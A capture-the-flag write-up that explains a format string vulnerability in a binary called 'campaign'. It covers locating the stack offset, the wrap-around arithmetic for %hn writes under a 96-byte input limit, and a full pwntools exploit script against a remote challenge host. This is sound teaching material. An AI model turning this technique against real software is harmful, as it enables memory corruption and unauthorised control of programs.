This is a comprehensive breakdown of the exploit for **campaign**. We moved from initial discovery to a surgical format string attack that bypassed a 96-byte input constraint.

---

## 1. Vulnerability Discovery

By running `checksec`, we identified that **PIE (Position Independent Executable) was disabled**. This meant the address of global variables would remain constant across every run.

In the GDB disassembly of `main`, we located two critical points:

### The Vulnerability: `printf`

Code snippet

`0x000000000040130f <+178>: lea    -0x70(%rbp),%rax
0x0000000000401313 <+182>: mov    %rax,%rdi
0x000000000040131b <+190>: call   0x4010f0 <printf@plt>`

The program takes our input (`-0x70(%rbp)`) and passes it directly to `printf` as the format string. This allows us to read from and write to any memory address.

### The Target: `type`

Code snippet

`0x0000000000401357 <+250>: lea    0x2cf2(%rip),%rax  # 0x404050 <type>
0x000000000040135e <+257>: mov    %rax,%rdi
0x0000000000401361 <+260>: call   0x401110 <strcmp@plt>`

The program compares the global variable `type` (at `0x404050`) with the string `"human"`. By default, `type` is "ai". We need to overwrite it.

---

## 2. Determining the Stack Offset

To write to a specific address, we need to know where our input buffer sits on the stack relative to `printf`’s arguments.

We sent: `AAAAAAAA %p %p %p %p %p %p %p %p %p %p`

The output showed `0x4141414141414141` at the **8th position**.

**Conclusion:** Our buffer starts at **Offset 8**.

---

## 3. The Constraint: The 96-Byte Wall

The program uses `fgets(name, 0x60, stdin)`, which limits our payload to **96 bytes**.

- A standard 1-byte write (`%hhn`) requires 5 addresses (40 bytes) + a long format string.
- If the payload exceeds 96 bytes, `fgets` truncates it, the addresses are lost, and the program crashes (`EOFError`).

**The Fix:** We used **2-byte writes (`%hn`)** to write "human" in only 3 chunks, significantly shortening the payload.

---

## 4. Relevant Hex Values

| **Value** | **Meaning** |
| --- | --- |
| **`0x404050`** | The memory address of the variable `type`. |
| **`0x7568`** | Hex for `"hu"` (Decimal: 30056). |
| **`0x616d`** | Hex for `"ma"` (Decimal: 24941). |
| **`0x006e`** | Hex for `"n\0"` (Decimal: 110). |

---

## 5. Annotated Final Solution

Python

    from pwn import *
    
    # 1. Setup connection and target info
    io = remote('133.88.122.244', 32061)
    target = 0x404050 # Global address of 'type' from objdump
    
    # 2. Mathematical Offset Calculation
    # Buffer starts at Offset 8. We place addresses at Byte 48 of the buffer.
    # Offset = 8 + (48 / 8) = 14.
    off = 14
    
    # 3. Build the Format String (Writing "human\0")
    # Segment 1: Print 30056 chars to make the counter 0x7568 ("hu")
    p1 = f"%{30056}c%{off}$hn"
    
    # Segment 2: We need counter to be 0x616d. Since 0x616d < 0x7568, 
    # we wrap around: (0x1616d - 0x7568) = 60421.
    p2 = f"%{60421}c%{off+1}$hn"
    
    # Segment 3: We need counter to be 0x006e ("n\0").
    # Wrap around: (0x2006e - 0x1616d) = 40705.
    p3 = f"%{40705}c%{off+2}$hn"
    
    fmt = (p1 + p2 + p3).encode()
    
    # 4. Construct Aligned Payload
    # Pad the format string to exactly 48 bytes so p64 addresses start at Offset 14
    payload = fmt.ljust(48, b"A")
    
    # 5. Append addresses corresponding to our %hn writes
    payload += p64(target)     # Points to 0x404050 (writes "hu")
    payload += p64(target + 2) # Points to 0x404052 (writes "ma")
    payload += p64(target + 4) # Points to 0x404054 (writes "n\0")
    
    # 6. Execution
    io.sendlineafter(b"Name: ", payload) # Trigger the format string vulnerability
    io.sendlineafter(b"Phone: ", b"1")   # Satisfy the scanf("%d")
    
    # 7. Flag Retrieval
    # The printf will dump ~131KB of padding, then the flag
    data = io.recvall()
    print(data.decode(errors='ignore'))

By precisely aligning the addresses to a multiple of 8 and calculating the `printf` wrap-around math, we forced the binary to believe we were "human," triggering the `system("cat flag.txt")` call.
